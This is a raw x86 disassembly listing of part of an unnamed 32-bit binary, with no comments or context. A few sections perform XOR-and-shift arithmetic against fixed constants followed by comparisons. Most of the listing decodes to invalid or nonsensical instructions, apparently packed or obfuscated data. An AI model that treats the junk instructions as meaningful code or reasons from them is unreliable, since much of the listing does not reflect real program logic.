  409b99:	jle    0x409b6c
  409b9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b9c:	ins    DWORD PTR es:[edi],dx
  409b9d:	push   0xffffffa7
  409b9f:	mov    DWORD PTR ds:0xdec71eed,ebp
  409ba5:	retf   0xaca3
  409ba8:	cdq    
  409ba9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409baa:	xor    edx,edx
  409bac:	or     eax,edx
  409bae:	add    eax,DWORD PTR ds:0x422548
  409bb4:	mov    DWORD PTR [ebp+0x14],eax
  409bb7:	mov    eax,DWORD PTR [ebp-0x60]
  409bba:	mov    ecx,DWORD PTR [ebp-0x5c]
  409bbd:	shrd   eax,ecx,0x2
  409bc1:	shr    ecx,0x2
  409bc4:	mov    ecx,DWORD PTR [ebp-0x60]
  409bc7:	mov    edx,DWORD PTR [ebp-0x5c]
  409bca:	xor    eax,edi
  409bcc:	shl    ecx,0x1e
  409bcf:	xor    edx,edx
  409bd1:	or     eax,edx
  409bd3:	mov    cl,BYTE PTR [ebp+eax*1-0x4]
  409bd7:	mov    eax,DWORD PTR [ebp+0x14]
  409bda:	or     BYTE PTR [eax],cl
  409bdc:	mov    eax,DWORD PTR [ebp-0x48]
  409bdf:	mov    ecx,DWORD PTR [ebp-0x44]
  409be2:	shrd   eax,ecx,0x2
  409be6:	shr    ecx,0x2
  409be9:	mov    ecx,DWORD PTR [ebp-0x48]
  409bec:	mov    edx,DWORD PTR [ebp-0x44]
  409bef:	xor    eax,edi
  409bf1:	xor    edx,edx
  409bf3:	or     eax,edx
  409bf5:	add    eax,DWORD PTR ds:0x422548
  409bfb:	shl    ecx,0x1e
  409bfe:	mov    DWORD PTR [ebp+0x14],eax
  409c01:	mov    eax,DWORD PTR [ebp-0x48]
  409c04:	mov    ecx,DWORD PTR [ebp-0x44]
  409c07:	shrd   eax,ecx,0x2
  409c0b:	shr    ecx,0x2
  409c0e:	mov    ecx,DWORD PTR [ebp-0x48]
  409c11:	mov    edx,DWORD PTR [ebp-0x44]
  409c14:	xor    eax,edi
  409c16:	shl    ecx,0x1e
  409c19:	xor    edx,edx
  409c1b:	or     eax,edx
  409c1d:	mov    cl,BYTE PTR [ebp+eax*1-0x4]
  409c21:	mov    eax,DWORD PTR [ebp+0x14]
  409c24:	add    BYTE PTR [eax],cl
  409c26:	mov    eax,DWORD PTR [ebp-0x38]
  409c29:	mov    ecx,DWORD PTR [ebp-0x34]
  409c2c:	shrd   eax,ecx,0x2
  409c30:	shr    ecx,0x2
  409c33:	mov    ecx,DWORD PTR [ebp-0x38]
  409c36:	mov    edx,DWORD PTR [ebp-0x34]
  409c39:	xor    edx,edx
  409c3b:	xor    eax,edi
  409c3d:	or     eax,edx
  409c3f:	add    eax,DWORD PTR ds:0x422548
  409c45:	shl    ecx,0x1e
  409c48:	mov    ecx,DWORD PTR [ebp-0x38]
  409c4b:	mov    edx,DWORD PTR [ebp-0x34]
  409c4e:	shrd   ecx,edx,0x2
  409c52:	xor    ecx,edi
  409c54:	shr    edx,0x2
  409c57:	mov    edx,DWORD PTR [ebp-0x38]
  409c5a:	mov    edi,DWORD PTR [ebp-0x34]
  409c5d:	xor    edi,edi
  409c5f:	or     ecx,edi
  409c61:	mov    cl,BYTE PTR [ebp+ecx*1-0x4]
  409c65:	or     BYTE PTR [eax],cl
  409c67:	shl    edx,0x1e
  409c6a:	mov    edx,DWORD PTR [ebx]
  409c6c:	mov    eax,DWORD PTR [ebx+0x4]
  409c6f:	mov    edi,DWORD PTR [ebx]
  409c71:	mov    ecx,DWORD PTR [ebx+0x4]
  409c74:	xor    edx,0xca79a577
  409c7a:	xor    eax,0x9c1b89e8
  409c7f:	shrd   edx,eax,0x2
  409c83:	xor    ecx,ecx
  409c85:	or     ecx,edx
  409c87:	mov    DWORD PTR [ebp+0x8],ecx
  409c8a:	mov    ecx,DWORD PTR [esi]
  409c8c:	mov    edx,DWORD PTR [esi+0x4]
  409c8f:	xor    edx,0x9c1b89e8
  409c95:	xor    ecx,0xca79a577
  409c9b:	mov    DWORD PTR [ebp+0x14],ecx
  409c9e:	mov    ecx,edx
  409ca0:	mov    edx,DWORD PTR [ebp+0x14]
  409ca3:	shrd   edx,ecx,0x2
  409ca7:	shr    eax,0x2
  409caa:	shl    edi,0x1e
  409cad:	mov    DWORD PTR [ebp-0x6c],eax
  409cb0:	mov    DWORD PTR [ebp-0x70],edx
  409cb3:	mov    edx,DWORD PTR [esi]
  409cb5:	mov    eax,0x40000000
  409cba:	xor    edi,eax
  409cbc:	or     edi,DWORD PTR [ebp-0x6c]
  409cbf:	mov    DWORD PTR [ebp+0x14],edx
  409cc2:	shl    DWORD PTR [ebp+0x14],0x1e
  409cc6:	xor    DWORD PTR [ebp+0x14],eax
  409cc9:	mov    DWORD PTR [ebp+0xc],edi
  409ccc:	jmp    0x40a0aa
  409cd1:	jbe    0x409d4e
  409cd3:	fstp   TBYTE PTR [edx+ebx*8-0x78e4c9e4]
  409cda:	ins    DWORD PTR es:[edi],dx
  409cdb:	cmp    DWORD PTR [ecx+eax*8-0x66],0x51
  409ce0:	jle    0x409caf
  409ce2:	cmp    DWORD PTR [eax],ebx
  409ce4:	sbb    BYTE PTR [esi-0x20e7e7ee],bl
  409cea:	push   ebp
  409ceb:	icebp  
  409cec:	div    DWORD PTR [esi]
  409cee:	imul   eax,ebp,0x2daa7ae0
  409cf4:	mov    ebp,0xffae6a5c
  409cf9:	adc    al,0xc0
  409cfb:	js     0x409cda
  409cfd:	adc    ebp,DWORD PTR [edi]
  409cff:	push   0x2f8f57ea
  409d04:	jmp    FWORD PTR [esp+eax*1+0x5026c5d5]
  409d0b:	xor    DWORD PTR [esi-0x7ae6dedc],0x2b356322
  409d15:	rcr    edx,1
  409d17:	in     al,dx
  409d18:	fs or  eax,0x21c17ebb
  409d1e:	and    al,0xbe
  409d20:	cli    
  409d21:	ins    BYTE PTR es:[edi],dx
  409d22:	fstp   TBYTE PTR [eax]
  409d24:	mov    ch,0x35
  409d26:	xorps  xmm6,XMMWORD PTR [esi]
  409d29:	add    al,0xf4
  409d2b:	rcl    al,1
  409d2d:	jp     0x409da8
  409d2f:	push   ss
  409d30:	gs cmp eax,0x42ad5f3b
  409d36:	cmp    ebx,DWORD PTR [ecx]
  409d38:	out    0xdc,eax
  409d3a:	fisubr DWORD PTR [edi-0x5c]
  409d3d:	pop    edx
  409d3e:	jp     0x409ceb
  409d40:	mov    bl,0x91
  409d42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409d43:	xchg   BYTE PTR [edi+ebx*1+0x49],bh
  409d47:	xchg   esp,eax
  409d48:	sar    DWORD PTR [ebp+0x2436fb],0x45
  409d4f:	pop    esi
  409d50:	ret    
  409d51:	out    0x36,al
  409d53:	lods   al,BYTE PTR ds:[esi]
  409d54:	rcr    bl,0xbe
  409d57:	sub    DWORD PTR [esi+ebx*4],0x597fde1f
  409d5e:	sbb    BYTE PTR [edi+eax*1+0x44fa7ee3],bh
  409d65:	mov    edi,0xd1bab445
  409d6a:	faddp  st(3),st
  409d6c:	in     al,0x9a
  409d6e:	sub    eax,0x7751cb1f
  409d73:	xchg   DWORD PTR [ebp-0x41],ebp
  409d76:	mov    eax,ds:0x7df83ca4
  409d7b:	clc    
  409d7c:	imul   ecx,DWORD PTR [eax+edi*1+0x24236528],0x9c749214
  409d87:	xor    ch,BYTE PTR [eax]
  409d89:	mov    ebx,0x7eaf792e
  409d8e:	xor    al,0xb4
  409d90:	add    DWORD PTR [edi+0x5d],esi
  409d93:	pop    es
  409d94:	mov    edx,0x5f2131de
  409d99:	iret   
  409d9a:	adc    eax,0x3be362d5
  409d9f:	inc    ebp
  409da0:	pop    eax
  409da1:	inc    ebx
  409da2:	cmc    
  409da3:	fld    TBYTE PTR [eax+0x49110a80]
  409da9:	(bad)  
  409daa:	loopne 0x409da2
  409dac:	(bad)  
  409dad:	jle    0x409d5d
  409daf:	cmovge esi,DWORD PTR [ebx]
  409db2:	aam    0x0
  409db4:	or     edx,DWORD PTR [ebx+ecx*1+0x5]
  409db8:	sbb    eax,0x2cfe91f1
  409dbd:	outs   dx,DWORD PTR ds:[esi]
  409dbe:	icebp  
  409dbf:	std    
  409dc0:	jle    0x409df4
  409dc2:	mov    ecx,0x223ba452
  409dc7:	sbb    eax,DWORD PTR [ecx+ebp*1+0x463f7e92]
  409dce:	jmp    0x409e4a
  409dd0:	clc    
  409dd1:	int    0x18
  409dd3:	dec    edx
  409dd4:	push   esi
  409dd5:	xchg   esp,eax
  409dd6:	daa    
  409dd7:	mov    ?,WORD PTR [edx-0x26]
  409dda:	dec    eax
  409ddb:	xor    DWORD PTR [eax-0x72],0x79
  409ddf:	and    al,0x48
  409de1:	repz dec ecx
  409de3:	push   edi
  409de4:	daa    
  409de5:	loop   0x409d85
  409de7:	and    edi,DWORD PTR [esi]
  409de9:	pop    es
  409dea:	jmp    0x409de8
  409dec:	adc    ch,BYTE PTR [esi]
  409dee:	ror    ch,cl
  409df0:	daa    
  409df1:	hlt    
  409df2:	mov    al,dl
  409df4:	arpl   WORD PTR [eax+0x7d],si
  409df7:	xchg   BYTE PTR [eax-0x18],cl
  409dfa:	mov    WORD PTR [ebp-0x44],?
  409dfd:	ret    
  409dfe:	push   edi
  409dff:	adc    eax,0x77dcd1ee
  409e04:	cmp    ah,ch
  409e06:	or     ecx,DWORD PTR [ecx+0x7a]
  409e09:	fucomi st,st(7)
  409e0b:	pop    edx
  409e0c:	or     edi,esp
  409e0e:	pushf  
  409e0f:	or     ah,ah
  409e11:	hlt    
  409e12:	dec    esi
  409e13:	push   es
  409e14:	mov    WORD PTR [esi],gs
  409e16:	ja     0x409e47
  409e18:	sti    
  409e19:	dec    ebx
  409e1a:	fs xor al,0xff
  409e1d:	imul   ebx,DWORD PTR [ecx],0xecf32932
  409e23:	mov    ebp,DWORD PTR [eax-0xc43e59c]
  409e29:	daa    
  409e2a:	mov    ebp,0x867ba288
  409e2f:	mov    esi,0x75962d5e
  409e34:	mov    BYTE PTR [ebx-0x5b],bl
  409e37:	(bad)  
  409e38:	cwde   
  409e39:	dec    esi
  409e3a:	(bad)  
  409e3b:	push   edi
  409e3c:	out    dx,al
  409e3d:	(bad)  
  409e3e:	xor    eax,0x89dd7c34
  409e43:	test   eax,0xf322b329
  409e48:	jl     0x409eaf
  409e4a:	mov    eax,ds:0x6f634f21
  409e4f:	test   al,0x9e
  409e51:	nop
  409e52:	jl     0x409e6c
  409e54:	inc    esi
  409e55:	or     BYTE PTR ds:0x4b134440,cl
  409e5b:	jmp    0x409e51
  409e5d:	jmp    0x409e28
  409e5f:	(bad)  
  409e60:	mov    ebp,0x505d175a
  409e65:	cdq    
  409e66:	jmp    0x409e6d
  409e68:	jo     0x409ed3
  409e6a:	jle    0x409df0
  409e6c:	xchg   edi,eax
  409e6d:	add    ah,BYTE PTR [ebx-0x71bbf4c4]
  409e73:	pop    ebx
  409e74:	cdq    
  409e75:	fstp   QWORD PTR [esi]
  409e77:	and    BYTE PTR [ebp-0x2d08bcd2],bl
  409e7d:	dec    edi
  409e7e:	test   BYTE PTR [edi+0x54],dh
  409e81:	mov    ebp,0x97a7adf8
  409e86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409e87:	or     edx,DWORD PTR [edi+0x4]
  409e8a:	pop    eax
  409e8b:	(bad)  
  409e8c:	inc    ebx
  409e8d:	jo     0x409e7a
  409e8f:	mov    bh,0xfc
  409e91:	jge    0x409e46
  409e93:	jo     0x409e7d
  409e95:	inc    edi
  409e96:	jne    0x409ede
  409e98:	push   edi
  409e99:	or     bl,cl
  409e9b:	inc    edx
  409e9c:	mov    ds:0xff56c651,eax
  409ea1:	add    eax,0x320714f6
  409ea6:	sar    BYTE PTR [esi-0x12],1
  409ea9:	pop    esi
  409eaa:	xor    eax,DWORD PTR [ecx+0x79]
  409ead:	and    eax,ebx
  409eaf:	dec    ebp
  409eb0:	push   cs
  409eb1:	dec    esi
  409eb2:	jns    0x409e6c
  409eb4:	hlt    
  409eb5:	sbb    ah,ch
  409eb7:	mov    cl,0x6c
  409eb9:	rcr    DWORD PTR [ebx+ebx*4+0x10c4cd48],cl
  409ec0:	retf   0xcd9c
  409ec3:	xor    BYTE PTR fs:[ecx+edi*4],dl
  409ec7:	out    dx,al
  409ec8:	out    dx,eax
  409ec9:	sbb    al,cl
  409ecb:	je     0x409eb7
  409ecd:	dec    eax
  409ece:	cmc    
  409ecf:	call   0xf5a011df
  409ed4:	mov    ah,0x8f
  409ed6:	leave  
  409ed7:	xchg   edi,eax
  409ed8:	les    esi,FWORD PTR [ebp+0x64]
  409edb:	dec    edx
  409edc:	and    BYTE PTR [edi-0x54933129],ah
  409ee2:	test   eax,0x6e4b2d57
  409ee7:	dec    ecx
  409ee8:	cmp    DWORD PTR [edx-0x6f2196f4],ecx
  409eee:	pop    ss
  409eef:	push   eax
  409ef0:	push   cs
  409ef1:	jge    0x409f2a
  409ef3:	outs   dx,DWORD PTR ds:[esi]
  409ef4:	xor    ch,BYTE PTR [esi-0x1bd490f4]
  409efa:	xor    edx,edx
  409efc:	inc    esi
  409efd:	popf   
  409efe:	dec    esi
  409eff:	add    al,0x64
  409f01:	pop    ds
  409f02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409f03:	jmp    0x8c58:0x23869860
  409f0a:	int3   
  409f0b:	add    ch,BYTE PTR [ebx+0x25efdab5]
  409f11:	cmp    al,0x7c
  409f13:	jae    0x409ed5
  409f15:	(bad)  
  409f16:	out    dx,eax
  409f17:	pop    edi
  409f18:	pusha  
  409f19:	dec    edx
  409f1a:	adc    esi,esp
  409f1c:	hlt    
  409f1d:	jge    0x409f91
  409f1f:	pop    ecx
  409f20:	mov    ecx,0x6cea437b
  409f25:	cli    
  409f26:	ins    DWORD PTR es:[edi],dx
  409f27:	daa    
  409f28:	and    esp,DWORD PTR [ebx-0x12522cc5]
  409f2e:	sbb    bh,ch
  409f30:	sub    al,0x65
  409f32:	push   0x52
  409f34:	push   0x5187bd44
  409f39:	inc    ecx
  409f3a:	push   ds
  409f3b:	ins    DWORD PTR es:[edi],dx
  409f3c:	push   ebp
  409f3d:	pop    esi
  409f3e:	pop    ss
  409f3f:	adc    al,0x15
  409f41:	mov    esp,DWORD PTR [edx-0xc]
  409f44:	dec    eax
  409f45:	(bad)
  409f48:	sbb    eax,0x7fd713e4
  409f4d:	addr16 jmp 0x409f1e
  409f50:	sar    ecx,cl
  409f52:	xor    ch,dl
  409f54:	ins    DWORD PTR es:[edi],dx
  409f55:	inc    edi
  409f56:	xchg   BYTE PTR [ecx],cl
  409f58:	repnz retf 0x7c1a
  409f5c:	jl     0x409f63
  409f5e:	pop    ss
  409f5f:	mov    edx,0x851b45fa
  409f64:	jg     0x409fb5
  409f66:	jnp    0x409f80
  409f68:	push   edi
  409f69:	mov    al,ds:0x5213ed20
  409f6e:	and    eax,0xff2934c0
  409f73:	int    0xbd
  409f75:	sbb    DWORD PTR [edi],esi
  409f77:	lahf   
  409f78:	push   es
  409f79:	pop    ss
  409f7a:	outs   dx,DWORD PTR ds:[esi]
  409f7b:	rcr    ah,cl
  409f7d:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  409f7f:	xor    BYTE PTR ds:0xd9b71f78,ah
  409f85:	jmp    0xb1d5:0xd6e56682
  409f8c:	jb     0x409ffb
  409f8e:	outs   dx,DWORD PTR ds:[esi]
  409f8f:	ror    DWORD PTR [eax+0x10811e00],1
  409f95:	add    DWORD PTR [ebp+0x2ec018ce],0x5e
  409f9c:	lea    ecx,[edx-0x5636a823]
  409fa2:	sahf   
  409fa3:	jno    0x409fdd
  409fa5:	es push cs
  409fa7:	(bad)  
  409fa8:	sub    ah,al
  409faa:	aad    0x84
  409fac:	xor    esp,DWORD PTR [ebx+0x66caafe1]
  409fb2:	cmp    BYTE PTR [eax+esi*2-0x6e],bh
  409fb6:	loope  0x409fbe
  409fb8:	sbb    ebx,DWORD PTR [esp+edx*8+0x3cd5914a]
  409fbf:	or     dl,bh
  409fc1:	mov    bl,0x9f
  409fc3:	sub    eax,eax
  409fc5:	jbe    0x40a026
  409fc7:	sbb    eax,0xe5a6945e
  409fcc:	out    0x88,al
  409fce:	fsubr  DWORD PTR [esi+0x29654b66]
  409fd4:	scas   eax,DWORD PTR es:[edi]
  409fd5:	jae    0x409fe0
  409fd7:	shr    DWORD PTR [ebx],1
  409fd9:	stc    
  409fda:	sub    eax,0x5fc6c349
  409fdf:	dec    eax
  409fe0:	push   ds
  409fe1:	pop    cx
  409fe3:	dec    ebx
  409fe4:	test   BYTE PTR [edi-0xe],0x1
  409fe8:	sbb    eax,0xffc0a70
  409fed:	sahf   
  409fee:	fisubr WORD PTR [edi]
  409ff0:	or     eax,0xf93a8e82
  409ff5:	call   0x9c72:0xc2657b0d
  409ffc:	xchg   BYTE PTR [edx+0x31918768],ah
  40a002:	mov    esi,0xec352b28
  40a007:	fist   WORD PTR [eax]
  40a009:	inc    edx
  40a00a:	pop    edi
  40a00b:	clc    
  40a00c:	pop    ss
  40a00d:	popa   
  40a00e:	dec    ecx
  40a00f:	push   ds
  40a010:	adc    BYTE PTR [edx-0x54],dh
  40a013:	lds    edx,FWORD PTR [eax-0x3f538ed0]
  40a019:	dec    edx
  40a01a:	cdq    
  40a01b:	arpl   WORD PTR ss:[edi],si
  40a01e:	test   BYTE PTR [esi+ebx*1-0x11],dh
  40a022:	jo     0x409ff6
  40a024:	out    dx,eax
  40a025:	test   DWORD PTR [edi],eax
  40a027:	dec    edx
  40a028:	push   ss
  40a029:	pop    edi
  40a02a:	les    esi,FWORD PTR [edi-0x30a7fa80]
  40a030:	fsubr  QWORD PTR [ecx+0x361ec958]
  40a036:	sbb    eax,0x61823b1
  40a03b:	adc    eax,0xad537a84
  40a040:	mov    fs,WORD PTR [ebp+0x12]
  40a043:	loope  0x40a056
  40a045:	inc    edx
  40a046:	push   ebp
  40a047:	add    DWORD PTR [ecx-0x1d],0xffffffef
  40a04b:	sbb    eax,0x882eb6e3
  40a050:	adc    BYTE PTR [edi+0x1e],ch
  40a053:	pop    ss
  40a054:	callw  0xda03
  40a058:	or     al,0x55
  40a05a:	push   esp
  40a05b:	mov    edi,0x18971caf
  40a060:	ins    DWORD PTR es:[edi],dx
  40a061:	cmp    ah,ah
  40a063:	ret    
  40a064:	clc    
  40a065:	jns    0x40a0e4
  40a067:	push   0xce89adac
  40a06c:	adc    ecx,eax
  40a06e:	clc    
  40a06f:	mov    al,0x58
  40a071:	xor    BYTE PTR [ecx],bh
  40a073:	sub    edi,DWORD PTR [ebp-0x28]
  40a076:	jne    0x40a0a6
  40a078:	push   0xf3e7adf0
  40a07d:	xlat   BYTE PTR ds:[ebx]
  40a07e:	pop    ss
  40a07f:	inc    eax
  40a080:	fimul  WORD PTR [edi-0x55f94d]
  40a086:	sti    
  40a087:	xchg   edi,eax
  40a088:	nop
  40a089:	dec    ebx
  40a08a:	dec    ebp
  40a08b:	pop    edi
  40a08c:	inc    ebp
  40a08d:	out    0x2e,eax
  40a08f:	pop    edi
  40a090:	sub    eax,DWORD PTR [edx+0x13]
  40a093:	cld    
  40a094:	ja     0x40a072
  40a096:	ins    DWORD PTR es:[edi],dx
  40a097:	out    dx,al
  40a098:	xchg   ecx,eax
  40a099:	push   0xf3cd9ad6
  40a09e:	cdq    
  40a09f:	mov    edx,0x2332364d
  40a0a4:	jg     0x40a0bd
  40a0a6:	sar    BYTE PTR [ecx+0x7e8b9877],cl
  40a0ac:	add    al,0x8b
  40a0ae:	jge    0x40a0c4
  40a0b0:	xor    edx,edx
  40a0b2:	or     edx,DWORD PTR [ebp-0x70]
  40a0b5:	shr    ecx,0x2
  40a0b8:	or     edi,ecx
  40a0ba:	cmp    edx,DWORD PTR [ebp+0x8]
  40a0bd:	jne    0x40a9b0
  40a0c3:	cmp    edi,DWORD PTR [ebp+0xc]
  40a0c6:	jne    0x40a9b0
  40a0cc:	jmp    0x40a926
  40a0d1:	mov    eax,DWORD PTR [esi]
  40a0d3:	mov    edx,DWORD PTR [esi+0x4]
  40a0d6:	mov    eax,DWORD PTR [esi]
  40a0d8:	mov    edx,DWORD PTR [esi+0x4]
  40a0db:	xor    eax,0xca79a577
  40a0e0:	xor    edx,ecx
  40a0e2:	mov    ecx,eax
  40a0e4:	mov    eax,edx
  40a0e6:	shrd   ecx,eax,0x2
  40a0ea:	shr    eax,0x2
  40a0ed:	mov    DWORD PTR [ebp+0xc],eax
  40a0f0:	mov    eax,DWORD PTR [esi]
  40a0f2:	mov    edx,DWORD PTR [esi+0x4]
  40a0f5:	mov    edx,eax
  40a0f7:	xor    eax,eax
  40a0f9:	or     eax,ecx
  40a0fb:	mov    ecx,DWORD PTR [ebx]
  40a0fd:	shl    edx,0x1e
  40a100:	xor    edx,0x40000000
  40a106:	mov    DWORD PTR [ebp+0x10],eax
  40a109:	mov    eax,edx
  40a10b:	or     eax,DWORD PTR [ebp+0xc]
  40a10e:	mov    edx,DWORD PTR [ebx+0x4]
  40a111:	push   eax
  40a112:	push   DWORD PTR [ebp+0x10]
  40a115:	push   edx
  40a116:	push   ecx
  40a117:	jmp    0x40a4f5
  40a11c:	std    
  40a11d:	dec    ecx
  40a11e:	mov    ah,0xd2
  40a120:	sub    al,0x22
  40a122:	fidivr DWORD PTR [edi]
  40a124:	test   al,0x29
  40a126:	push   ebp
  40a127:	stos   BYTE PTR es:[edi],al
  40a128:	retf   0x85b8
  40a12b:	jl     0x40a17f
  40a12d:	xor    ebx,DWORD PTR [eax]
  40a12f:	sbb    BYTE PTR [esi-0x48e7e7ee],bl
  40a135:	popa   
  40a136:	rcr    esi,0xc9
  40a139:	sub    BYTE PTR es:[ecx+0x19],0x26
  40a13e:	mov    ds:0xcdf7cade,al
  40a143:	sub    dh,BYTE PTR [esi+0x68]
  40a146:	stos   BYTE PTR es:[edi],al
  40a147:	pop    edi
  40a148:	not    DWORD PTR [ecx+0x4484cb31]
  40a14e:	pop    eax
  40a14f:	mov    esi,0x487de6bd
  40a154:	jge    0x40a0f5
  40a156:	cdq    
  40a157:	sbb    eax,0x738d36e1
  40a15c:	push   edi
  40a15d:	adc    eax,0xb6bd7b2a
  40a162:	or     dl,bl
  40a164:	mov    eax,ds:0x1d6eaaf8
  40a169:	fistp  QWORD PTR [edi+0x7c]
  40a16c:	or     esp,esp
  40a16e:	pushw  0x39
  40a171:	in     al,dx
  40a172:	fld    QWORD PTR [edi]
  40a174:	sub    al,0xeb
  40a176:	icebp  
  40a177:	mov    eax,DWORD PTR [edi-0x53342e1d]
  40a17d:	mov    ah,0x98
  40a17f:	mov    dh,0xb9
  40a181:	add    dh,BYTE PTR [edx+0x9]
  40a184:	ds mov dl,0x28
  40a187:	pop    ss
  40a188:	cmp    edi,DWORD PTR [ecx+0x532e09be]
  40a18e:	shr    ebp,1
  40a190:	jno    0x40a161
  40a192:	mov    ?,WORD PTR [ebx-0x183aa0f9]
  40a198:	or     edx,DWORD PTR [edx]
  40a19a:	ret    0x8413
  40a19d:	push   cs
  40a19e:	ja     0x40a21d
  40a1a0:	sbb    BYTE PTR [edi],bh
  40a1a2:	sub    al,ah
  40a1a4:	xchg   edi,eax
  40a1a5:	rol    eax,cl
  40a1a7:	stos   BYTE PTR es:[edi],al
  40a1a8:	inc    ebp
  40a1a9:	add    eax,0x5fdebf3d
  40a1ae:	sub    ebp,DWORD PTR [edx+0x3cb9091e]
  40a1b4:	xchg   esi,eax
  40a1b5:	lock xor dh,BYTE PTR [ebx+0x7e]
  40a1b9:	push   ds
  40a1ba:	cmp    DWORD PTR [edi-0x1e],ecx
  40a1bd:	loopne 0x40a163
  40a1bf:	(bad)  
  40a1c0:	sti    
  40a1c1:	mov    cl,0x5b
  40a1c3:	adc    bh,al
  40a1c5:	mov    DWORD PTR [ebx+0x67cf92f2],ecx
  40a1cb:	xchg   ebx,eax
  40a1cc:	(bad)  
  40a1cd:	sbb    BYTE PTR [edi+0x4],al
  40a1d0:	test   al,0x65
  40a1d2:	mov    eax,ds:0x878e8a21
  40a1d7:	inc    edi
  40a1d8:	call   0xcb89:0x7c2ccb9f
  40a1df:	mov    eax,ds:0xb6e53cb4
  40a1e4:	push   edi
  40a1e5:	scas   eax,DWORD PTR es:[edi]
  40a1e6:	in     eax,0xcc
  40a1e8:	add    dl,dl
  40a1ea:	mov    edx,0xaf07dc3b
  40a1ef:	fistp  DWORD PTR [edi-0x6cbfd1a3]
  40a1f5:	popa   
  40a1f6:	mov    esp,0xe6e9b2c9
  40a1fb:	(bad)  [esi-0x67]
  40a1fe:	clc    
  40a1ff:	add    eax,0x74c7e17f
  40a204:	aad    0x24
  40a206:	test   BYTE PTR [ecx],dl
  40a208:	xlat   BYTE PTR gs:[ebx]
  40a20a:	xchg   edx,eax
  40a20b:	sbb    BYTE PTR [ecx-0x2dcad615],0xdf
  40a212:	pop    ss
  40a213:	retfw  0xc25
  40a217:	or     DWORD PTR [edx-0x4f],0x131d1cf7
  40a21e:	cmp    eax,0xe525d834
  40a223:	dec    ecx
  40a224:	dec    edi
  40a225:	jns    0x40a1e5
  40a227:	fmulp  st(2),st
  40a229:	sub    BYTE PTR [edx+0x1b],0x3a
  40a22d:	in     al,0x9d
  40a22f:	rol    BYTE PTR [ebp-0x28625f17],1
  40a235:	push   ss
  40a236:	pop    esp
  40a237:	and    DWORD PTR [edi],ebp
  40a239:	cwde   
  40a23a:	pushf  
  40a23b:	in     eax,dx
  40a23c:	emms   
  40a23e:	push   ebx
  40a23f:	fcomp  st(4)
  40a241:	pop    ds
  40a242:	push   ebp
  40a243:	push   edi
  40a244:	sub    BYTE PTR [esi+0xf88bd0],cl
  40a24a:	cdq    
  40a24b:	scas   al,BYTE PTR es:[edi]
  40a24c:	push   edx
  40a24d:	pop    ss
  40a24e:	xchg   DWORD PTR [esi-0x12e051ee],edx
  40a254:	add    BYTE PTR [edi],bl
  40a256:	lods   eax,DWORD PTR ds:[esi]
  40a257:	inc    esp
  40a258:	push   es
  40a259:	or     BYTE PTR [edx-0x5e],al
  40a25c:	push   0xffffff99
  40a25e:	sti    
  40a25f:	and    eax,edi
  40a261:	xlat   BYTE PTR ds:[ebx]
  40a262:	pop    ebp
  40a263:	scas   eax,DWORD PTR es:[edi]
  40a264:	xchg   edx,eax
  40a265:	dec    esp
  40a266:	(bad)  
  40a267:	xchg   esi,eax
  40a268:	cld    
  40a269:	pusha  
  40a26a:	es dec ebx
  40a26c:	add    DWORD PTR [esi],ebx
  40a26e:	and    eax,0x5296427b
  40a273:	scas   eax,DWORD PTR es:[edi]
  40a274:	bound  edx,QWORD PTR [esi-0x2a]
  40a277:	fst    DWORD PTR [ebp-0x64fed5e7]
  40a27d:	jge    0x40a225
  40a27f:	jmp    0xb9c3c500
  40a284:	push   ds
  40a285:	xor    al,0x6a
  40a287:	add    DWORD PTR [ebp+0x1a],ebx
  40a28a:	xchg   ecx,eax
  40a28b:	mov    WORD PTR [edx-0x6a8dd1ba],ss
  40a291:	jae    0x40a258
  40a293:	push   ebx
  40a294:	(bad)  
  40a295:	int3   
  40a296:	les    esi,FWORD PTR [ebx+0x5d143a23]
  40a29c:	xchg   edx,eax
  40a29d:	xlat   BYTE PTR fs:[ebx]
  40a29f:	and    al,BYTE PTR [eax]
  40a2a1:	outs   dx,DWORD PTR ds:[esi]
  40a2a2:	jne    0x40a27e
  40a2a4:	or     al,0xf
  40a2a6:	arpl   WORD PTR [edx-0x79f02970],di
  40a2ac:	nop
  40a2ad:	cmp    ebp,DWORD PTR [ecx]
  40a2af:	daa    
  40a2b0:	and    eax,0xb60d26c
  40a2b5:	test   al,0xe0
  40a2b7:	call   0x765f60da
  40a2bc:	shl    al,cl
  40a2be:	push   0xffffffe2
  40a2c0:	dec    ebp
  40a2c1:	pushf  
  40a2c2:	gs out 0x9,al
  40a2c5:	mov    edx,0x7404558e
  40a2ca:	int3   
  40a2cb:	je     0x40a304
  40a2cd:	fiadd  DWORD PTR [ebp-0x52287ca3]
  40a2d3:	push   0x73acdd3
  40a2d8:	sbb    edi,DWORD PTR [edi+ebx*1]
  40a2db:	jmp    eax
  40a2dd:	add    al,0x81
  40a2df:	pop    ebx
  40a2e0:	xor    ebp,DWORD PTR [ebp-0x4023a9c9]
  40a2e6:	cmp    ebp,ecx
  40a2e8:	std    
  40a2e9:	jecxz  0x40a30d
  40a2eb:	jecxz  0x40a365
  40a2ed:	adc    cl,BYTE PTR [edi+0x47]
  40a2f0:	mov    bh,0x22
  40a2f2:	jne    0x40a35e
  40a2f4:	inc    edx
  40a2f5:	pusha  
  40a2f6:	iret   
  40a2f7:	mov    bl,0xdd
  40a2f9:	ja     0x40a2c6
  40a2fb:	lock cwde 
  40a2fd:	(bad)  
  40a2fe:	push   esp
  40a2ff:	jle    0x40a311
  40a301:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a302:	call   0x6feec788
  40a307:	inc    eax
  40a308:	dec    ecx
  40a309:	pop    edx
  40a30a:	popa   
  40a30b:	aam    0x11
  40a30d:	ins    BYTE PTR es:[edi],dx
  40a30e:	aaa    
  40a30f:	aaa    
  40a310:	inc    edi
  40a311:	jne    0x40a322
  40a313:	mov    ecx,0x5f0e222a
  40a318:	outs   dx,BYTE PTR ds:[esi]
  40a319:	mov    ah,0xfe
  40a31b:	ds std 
  40a31d:	adc    DWORD PTR ds:0x3e27b4e0,edi
  40a323:	mov    edx,0x323e06a8
  40a328:	dec    eax
  40a329:	pop    ds
  40a32a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a32b:	leave  
  40a32c:	scas   al,BYTE PTR es:[di]
